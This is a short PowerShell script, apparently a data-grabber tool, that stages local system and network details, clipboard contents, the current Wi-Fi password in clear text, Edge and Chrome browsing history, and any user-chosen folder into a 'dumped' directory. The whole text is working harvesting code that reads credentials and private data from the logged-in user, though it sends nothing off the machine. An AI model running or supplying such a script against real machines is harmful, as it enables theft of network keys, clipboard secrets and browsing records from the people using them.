mkdir dumped -Force #all the dumped data is stored in here.
mkdir dumped/edge -Force #All the MS edge data is stored here.
mkdir dumped/chrome -Force #All Google Chrome data is stored here.
mkdir dumped/wantedfolder -Force #Desired Path contents are stored here.

#below is just standard system and network info.
arp -a > dumped/iplist.txt 
ipconfig > dumped/ipconfig.txt 
ipconfig /displaydns > dumped/dnsdisplay.txt 
systeminfo > dumped/sysinfo.txt 
tasklist > dumped/tasklist.txt

Get-Clipboard > dumped/clipboard.txt

#This gets network information by checking the network name and getting the info based on that.
$networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name
Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt

try {
    #This command copies edge history data to dumped/edge
    $origin_edge_path="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
    $edgehistorycopypath="dumped\edge"
    Copy-Item -Path $origin_edge_path -Destination $edgehistorycopypath -Force -ErrorAction Stop
}
catch {
    Write-Host "Edge Is not installed on this device."
}


try {
    #This command copies chrome history data to dumped/chrome.
    $origin_chrome_path="C:\Users\$Env:UserName\AppData\Local\Google\Chrome\User Data\Default\History"
    $chromehistorycopypath="dumped\chrome"
    Copy-Item -Path $origin_chrome_path -Destination $chromehistorycopypath -Force -ErrorAction Stop
}
catch {
    Write-Host "Google Chrome is not installed on this device."
}

#Asks user for desired path to copy and then copies it and its contents.
Write-Output "Write your desired path to copy:"
$wantedpath=Read-Host
$wantedcopy="dumped/wantedfolder"
Copy-Item -Path $wantedpath -Destination $wantedcopy -Recurse -Force -ErrorAction Continue